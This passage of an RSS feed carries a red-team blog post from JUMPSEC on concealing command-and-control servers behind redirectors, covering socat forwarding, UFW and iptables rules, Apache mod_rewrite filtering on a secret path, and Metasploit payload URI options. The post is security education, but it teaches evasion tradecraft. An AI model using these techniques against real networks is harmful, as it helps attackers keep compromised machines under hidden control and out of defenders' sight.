+&lt;p&gt;Regardless of the obfuscation, C2’s must be commanded and reported back. This &lt;strong&gt;beaconing&lt;/strong&gt; is an ebb and flow that must occur and therefore is something a defender can zero in on to detect across their network. This is no easy feat of course. JUMPSEC’s &lt;strong&gt;red team and blue team work togethe&lt;/strong&gt;r to apply the innovate offensive security research from the red team in defensive context to continuously develop detection for the latest techniques.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;As criminal adversaries often choose &lt;strong&gt;Cobalt Strike as their&lt;/strong&gt; &lt;a href=&#34;https://www.recordedfuture.com/2020-adversary-infrastructure-report/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;weapon of choice&lt;/strong&gt;&lt;/a&gt;, blue teams have given it acute attention. Defensive security researchers have &lt;a href=&#34;https://talos-intelligence-site.s3.amazonaws.com/production/document_files/files/000/095/031/original/Talos_Cobalt_Strike.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;strong&gt;devoted entire reports&lt;/strong&gt;&lt;/a&gt; to detecting Cobalt Strike C2 communication! The uncomfortable attention of the blue team has compelled red team operators to ensure that their C2 infrastructure is &lt;strong&gt;customised&lt;/strong&gt; for each assessment, remains &lt;strong&gt;covert&lt;/strong&gt;, and should elude blue team sight for an extended period.&lt;/p&gt;
+&lt;p&gt;In this article, we share some &lt;strong&gt;red team tips&lt;/strong&gt; on &lt;strong&gt;hardening&lt;/strong&gt; command-and-control that ensure offensive engagements remain &lt;strong&gt;flexible, reliable, and elusive.&lt;/strong&gt; There are many ways to harden one&amp;rsquo;s C2 infrastructure. Let&amp;rsquo;s zero in on one particular component - &lt;strong&gt;redirectors&lt;/strong&gt; - which we have found are rather important for obfuscation.&lt;/p&gt;
+&lt;h2&gt;&lt;strong&gt;2. Redirectors&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;2-redirectors&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#2-redirectors&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;2.1 What is a Redirector?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;21-what-is-a-redirector&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#21-what-is-a-redirector&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Redirectors are an essential component for advanced red teaming. Redirectors allow malicious traffic to come and go as it pleases, but remain &lt;strong&gt;hidden from detection&lt;/strong&gt;. The objective of a redirector is to &lt;strong&gt;mask the core C2 infrastructure from prying blue team eyes&lt;/strong&gt;, and allow the red team operator &lt;strong&gt;hidden communication with a compromised machine&lt;/strong&gt;. Redirectors seek to mask and protect their backend server, the main orchestration server for all C2.&lt;/p&gt;
+&lt;figure&gt;
+&lt;p&gt;&lt;img src=&#34;images/2021-07-16_10-55-1024x572.png&#34; alt=&#34;2021 07 16 10 55&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;figcaption&gt;
+&lt;p&gt;Simplified, but you get the idea&lt;/p&gt;
+&lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;p&gt;Redirectors offer many advantages around obfuscation but they also offer a &lt;strong&gt;resilience&lt;/strong&gt; and &lt;strong&gt;persistence&lt;/strong&gt; advantage. If the blue team are able to successfully identify and block an IP address associated with the C2 infrastructure, the red team operator can quickly spin up a redirector and continue to keep the core backend server IP address hidden. &lt;/p&gt;
+&lt;h3&gt;2.2 Example of C2 without a Redirector&lt;span class=&#34;absolute -mt-20&#34; id=&#34;22-example-of-c2-without-a-redirector&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#22-example-of-c2-without-a-redirector&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;To understand the benefit of a redirector, let’s demonstrate how easy an attentive blue team defender can shut down and ruin a red team engagement that uses a vanilla C2. &lt;/p&gt;
+&lt;p&gt;We can use &lt;strong&gt;msfvenom&lt;/strong&gt; to generate a payload that doesn’t do anything special, it simply creates an executable that will call back to our C2 server. There’s no obfuscation, no clever C2-over-DNS techniques, no redirection - &lt;strong&gt;nothing!&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-02.png&#34; alt=&#34;2021 07 16 11 02&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;If we take this C2 payload and execute it on a machine, we will inevitably be caught by any blue team worth their salt. Using &lt;strong&gt;netstat&lt;/strong&gt; on the target machine, from a defender’s perspective it’s clear to see the machine is currently communicating to a strange and new IP address on port 8080, based on an unusual executable (C2test.exe).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-02_1.png&#34; alt=&#34;2021 07 16 11 02 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;This would invariably stand out to a defender as suspicious - they would not recognise the executable (even if it was called something less obvious) and would not recognise the private IP in the conversation. The blue team would quarantine the machine and sever the malicious connection we worked so hard to establish.&lt;/p&gt;
+&lt;h1&gt;&lt;strong&gt;3. Redirectors save the Red Team’s day&lt;/strong&gt; &lt;/h1&gt;&lt;p&gt;The above is a textbook example of red team bad practice. A better approach is to use &lt;strong&gt;redirectors&lt;/strong&gt; to prevent the infrastructure from being exposed at the first hurdle.&lt;/p&gt;
+&lt;p&gt;There are a plethora of redirection techniques, and we couldn’t possibly spoil all of our own fun by sharing them (the blue team can read too you know?). We’ll focus on the technical approach behind network traffic redirection. &lt;/p&gt;
+&lt;h2&gt;&lt;strong&gt;3.1 Dumb Pipe Redirection&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;31-dumb-pipe-redirection&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#31-dumb-pipe-redirection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Dumb pipe redirection does exactly what it says on the tin. It blindly forwards our malicious traffic from node to node, but lacks sophistication for controlling the traffic. It does however allow us to obfuscate the IP of the core server, so that’s all that matters for now.&lt;/p&gt;
+&lt;p&gt;To achieve dumb pipe redirection we can rely on &lt;strong&gt;socat,&lt;/strong&gt; with different &lt;strong&gt;firewall&lt;/strong&gt; implementations to improve it.  &lt;/p&gt;
+&lt;h3&gt;&lt;strong&gt;3.1.1 Socat&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;311-socat&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#311-socat&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The following socat command would be run on our &lt;strong&gt;burnable redirector server&lt;/strong&gt; to enable  dumb pipe redirection towards our C2 server. &lt;/p&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo socat TCP4-LISTEN:8080,fork TCP:c2address:PORT&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-09.png&#34; alt=&#34;2021 07 16 11 09&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;This allows TCP network traffic on port 8080 of the &lt;strong&gt;redirection&lt;/strong&gt; &lt;strong&gt;machine&lt;/strong&gt; to communicate on port 8080 of the &lt;strong&gt;C2 server.&lt;/strong&gt; So now our C2 server can communicate with our disposable redirection server, we now need to put the compromise machine in communication with the redirection server. This then allows a nice &lt;strong&gt;chain of communication from C2 server, to redirector, to compromised machine,&lt;/strong&gt; which remains hidden from the eyes of defenders. &lt;/p&gt;
+&lt;p&gt;We now need to generate a payload that will complete the link in the chain and allow the compromised machine to communicate to our redirect server, the middle-man.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-10.png&#34; alt=&#34;2021 07 16 11 10&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;We can take this executable payload and detonate it on the target machine.When executed, it connects to our redirector server, which then forwards TCP port 8080 to our core C2 server blindly. In the screenshot below, we can see that there is a three-machine relay for communication: the top image shows the &lt;strong&gt;172.16.15.135&lt;/strong&gt; target machine in communication with the &lt;strong&gt;redirector&lt;/strong&gt; &lt;strong&gt;server&lt;/strong&gt; on &lt;strong&gt;x.x.13.49:8080,&lt;/strong&gt; the redirector machine is then in communication with the &lt;strong&gt;C2 server&lt;/strong&gt; on &lt;strong&gt;x.x.x.223:8080&lt;/strong&gt;. If the blue team catch us now, &lt;strong&gt;all we will lose is the redirector server&lt;/strong&gt; and not our core infrastructure.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-11-1024x835.png&#34; alt=&#34;2021 07 16 11 11&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;strong&gt;3.1.2 Socat and Uncomplicated Firewall&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;312-socat-and-uncomplicated-firewall&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#312-socat-and-uncomplicated-firewall&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;There is, however, one &lt;strong&gt;disavantadge&lt;/strong&gt; to this method of &lt;strong&gt;socat dumb pipe redirection&lt;/strong&gt;. Anyone with the &lt;strong&gt;redirector&amp;rsquo;s&lt;/strong&gt; &lt;strong&gt;IP&lt;/strong&gt; &lt;strong&gt;address&lt;/strong&gt; can now connect to our listener via the specified port. Let’s illuminate this using the network scanning tool &lt;strong&gt;nmap,&lt;/strong&gt; which shows that we’re running a &lt;strong&gt;proxy&lt;/strong&gt; (the redirector). A defender would definitely notice if there was an unrecognised web proxy in communication with a machine in their internal network. &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-12-1024x248.png&#34; alt=&#34;2021 07 16 11 12&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;To avoid this situation, let’s maker our dumb pipe redirector a bit smarter. We can configure a &lt;strong&gt;firewall&lt;/strong&gt; that will protect our infrastructure and allow only the redirector to directly connect. In this case, we&amp;rsquo;re going to use &lt;strong&gt;ufw&lt;/strong&gt;, which stands for &lt;strong&gt;Uncomplicated Firewall&lt;/strong&gt; and is available for a variety of UNIX distributions. &lt;/p&gt;
+&lt;p&gt;Let’s configure UFW on our &lt;strong&gt;core C2 server&lt;/strong&gt; and &lt;strong&gt;redirector server&lt;/strong&gt; to allow for traffic monitoring:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Let’s configure Port &lt;strong&gt;22&lt;/strong&gt;, which is usually reserved for SSH services. &lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Let’s configure Traffic from our &lt;strong&gt;redirector&lt;/strong&gt; IP &lt;strong&gt;outbound&lt;/strong&gt; and &lt;strong&gt;inbound&lt;/strong&gt; from TCP port &lt;strong&gt;8080&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;And then let’s finish up by &lt;strong&gt;disallowing outbound traffic&lt;/strong&gt; anywhere else&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-14.png&#34; alt=&#34;2021 07 16 11 14&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;What we have here is a firewall configuration that allows C2 communication from our malicious core server to our malicious core redirector.  We then need to duplicate our efforts on the &lt;strong&gt;redirector server’s firewall.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-27.png&#34; alt=&#34;2021 07 16 11 27&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;When we’re all done, our tracks should be covered. We can confirm this using &lt;strong&gt;nmap&lt;/strong&gt;. When we scan our Core C2 IP address, it now displays as filtered, indicating that traffic is secured and is only accessible via the redirector server. &lt;strong&gt;Awesome for us&lt;/strong&gt;, not so much for the blue team!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-29.png&#34; alt=&#34;2021 07 16 11 29&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;strong&gt;3.1.3 IPTables Redirection&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;313-iptables-redirection&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#313-iptables-redirection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;IPtables&lt;/strong&gt; is a unix tool that allows granular control of network traffic, down to the packet level. It’s an incredibly powerful tool that can be leveraged for both defense and offense - let’s try the latter. &lt;/p&gt;
+&lt;p&gt;It is possible to acheive &lt;strong&gt;same&lt;/strong&gt; &lt;strong&gt;result&lt;/strong&gt; as socat dumb pipe redirection but using &lt;strong&gt;IPTables&lt;/strong&gt; instead. Here, we specify exactly which network traffic &lt;strong&gt;packets&lt;/strong&gt; should accepted or dropped, and where they should be &lt;strong&gt;forwarded&lt;/strong&gt; or &lt;strong&gt;rerouted&lt;/strong&gt; in order to meet our tailored specification for masking the traffic to and from our core C2 server. &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-30.png&#34; alt=&#34;2021 07 16 11 30&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;The end result is similar to &lt;strong&gt;socat&lt;/strong&gt; and &lt;strong&gt;ufw&lt;/strong&gt;, and we manage to communicate from C2 server, to redirector, to compromised endpoint all without revealing the C2 server to the blue team! In the screenshot below, we’re actively running malicious commands to the compromised machine whilst leveraging the granular iptables rules to obfuscate our rerouted malicious network traffic. &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-30_1.png&#34; alt=&#34;2021 07 16 11 30 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h2&gt;&lt;strong&gt;3.2 Redirection using Apache mod_rewrite&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;32-redirection-using-apache-mod_rewrite&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#32-redirection-using-apache-mod_rewrite&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;An alternate method to dumb pipe redirection employs &lt;strong&gt;Apache mod_rewrite&lt;/strong&gt;, which offers a number of techniques to strengthen our infrastructure. &lt;/p&gt;
+&lt;p&gt;Essentially, apache mod_rewrite allows a proxy to behave differently if fed different arbitrary information - such as user agent, operating system, IP address and more. This creates more varied network traffic, as the rules we give will dictate if traffic should be dropped, accepted, or redirected according to particular prescribed behaviour. There is significant time and effort consumption to using this method compared to socat and the firewalls, delivering improved results in return. &lt;/p&gt;
+&lt;p&gt;We can accomplish this by specifying rulesets and a &lt;em&gt;.htaccess&lt;/em&gt; file in the webserver&amp;rsquo;s root directory. In our case, we&amp;rsquo;re going to create a rule that redirects curious visitors to our labs.jumpsec.com page. Let’s take a deep dive into setting this up. &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-32-1024x616.png&#34; alt=&#34;2021 07 16 11 32&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;strong&gt;3.2.1 Configuring Apache Mod_Rewrite&lt;/strong&gt; &lt;span class=&#34;absolute -mt-20&#34; id=&#34;321-configuring-apache-mod_rewrite&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#321-configuring-apache-mod_rewrite&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;To begin, we need Apache2 on our redirection server. We then need to open up its configurations file, and change &lt;em&gt;AllowOverride&lt;/em&gt; from &lt;strong&gt;None&lt;/strong&gt; to &lt;strong&gt;All&lt;/strong&gt; inside &lt;em&gt;/etc/apache2/apache.conf&lt;/em&gt; to begin the process of abusing mod_rewrite for our own malicious intent. &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-33.png&#34; alt=&#34;2021 07 16 11 33&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;We then can &lt;strong&gt;enable&lt;/strong&gt; Apache2 module rewrite, and follow up by restarting the apache web service so the change can take effect. &lt;/p&gt;
+&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo a2enmod rewrite proxy proxy_http
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo service apache2 restart&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
+    &lt;button
+      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
+      title=&#34;Copy code&#34;
+    &gt;
+      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
+    &lt;/button&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-34.png&#34; alt=&#34;2021 07 16 11 34&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Then, within the web server&amp;rsquo;s root directory, we must create a &lt;strong&gt;.htaccess&lt;/strong&gt; file. This will filter traffic based on our specified criteria and is therefore a crucial component in this whole operation (so let’s not make any mistakes here!). Set  &lt;strong&gt;.htaccess&lt;/strong&gt; file&amp;rsquo;s &lt;em&gt;chmod&lt;/em&gt; permissions to &lt;strong&gt;644&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-37.png&#34; alt=&#34;2021 07 16 11 37&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;strong&gt;3.2.2 Malicious Rules&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;322-malicious-rules&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#322-malicious-rules&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Now that we’ve installed the necessities, let’s get to work. We need to create our ruleset that will filter proxy traffic based on arbitrary behaviours / strings that we give to the web server. &lt;/p&gt;
+&lt;p&gt;Let’s create a rule that behaves differently depending on if an incoming request has a particular &lt;strong&gt;directory.&lt;/strong&gt; Only we will know the secret directory that will facilitate malicious traffic. To everyone else, we will forward them to this awesome site we know…&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-39.png&#34; alt=&#34;2021 07 16 11 39&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;In the above ruleset, we can see that if the directory &lt;strong&gt;/jstest&lt;/strong&gt; is explicitly included in the http(s) traffic, it will be forwarded to our &lt;strong&gt;C2 core server&lt;/strong&gt; running on &lt;strong&gt;x.x.x.223.&lt;/strong&gt; If any traffic attempts to come that does not include that specific &lt;strong&gt;/jstest&lt;/strong&gt; directory, then the apache web server will behave differently and reroute the nosey, inquisitive investigator to &lt;strong&gt;&lt;em&gt;labs.jumpsec.com&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;To the unwitting visitor to our redirector middle-man server, they are simply visiting the JUMPSEC labs website. They did include the secret &lt;strong&gt;/jstest&lt;/strong&gt; directory in their request, and therefore they will not discover the hidden malicious infrastructure we have set up.&lt;/p&gt;
+&lt;p&gt;Conversely, by offering the &lt;strong&gt;/jstest&lt;/strong&gt; directory in a request, we are able to control and issue commands across our obfuscated communication line. In our example below, we could have had something incredibly sophisticated and malicious&amp;hellip;instead we chose to issue a warning.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-40.png&#34; alt=&#34;2021 07 16 11 40&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;strong&gt;3.2.3 Integrating mod_rewrite elsewhere&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;323-integrating-mod_rewrite-elsewhere&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#323-integrating-mod_rewrite-elsewhere&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;It’s awesome to use mod_rewrite to arbitrarily change the behaviour of our web server. However the default C2 usability of this method is unwieldy. In the example below, we can see it’s a bit clunky and doesn’t lend itself to the rapid action that a red team operator needs. &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-41-1024x158.png&#34; alt=&#34;2021 07 16 11 41&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;It is possible to fit this apache mod_rewrite technique in as a component to other C2 infrastructure. Earlier, we spoke about &lt;strong&gt;Metasploit&lt;/strong&gt;, and whilst it isn’t the most reliable of it’s peers it is quite flexible and good at fitting new components in. We can make &lt;strong&gt;Metasploit&lt;/strong&gt; and &lt;strong&gt;apache mod_rewrite&lt;/strong&gt; play nicely with each other, which will make our ability to issue commands that much easier.&lt;/p&gt;
+&lt;p&gt;In &lt;strong&gt;Metasploit&lt;/strong&gt;, we can leverage the &lt;em&gt;-URI uriflag&lt;/em&gt;. If we run a meterpreter payload on the compromised machine, we can ensure that only payloads with this URI flag can connect to our C2 Server, preventing anybody interested from peeking into our domains. This step doesn’t just ensure our C2 remains &lt;strong&gt;hidden&lt;/strong&gt; but also &lt;strong&gt;improves&lt;/strong&gt; the &lt;strong&gt;usability&lt;/strong&gt; of our redirections.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;images/2021-07-16_11-42.png&#34; alt=&#34;2021 07 16 11 42&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h1&gt;&lt;strong&gt;4. Beyond C2&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;This article only covered one of the many elements of the offensive security arsenal. Robust and obfuscated C2 is one of the most critical actions that successful red teamers and real-world attacker’s alike take when compromising a network. I hope that this high-level article demonstrates that creating a covert infrastructure is a critical step in effective and covert attack simulation.&lt;/p&gt;
+&lt;p&gt;There is much more to talk about overall about the red team’s attack path repertoire. And there is still more to talk about C2 itself! There are so many ways to customise a C2 infrastructure that some have even written and deployed &lt;a href=&#34;https://labs.f-secure.com/tools/c3/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;C3 infrastructure&lt;/a&gt; as part of their engagements. Adversaries in real life have used C3 to create kernel-level APIs that they then use to communicate, rather than utilising the protocols and services that C2 uses (like SSH or HTTPs). The limits are truly endless for command-and-control.&lt;/p&gt;
+&lt;p&gt;Shd is a Red Team Operator @ JUMPSEC&lt;/p&gt;
+
+      </description>
+    </item>
+    
+  </channel>
+</rss>
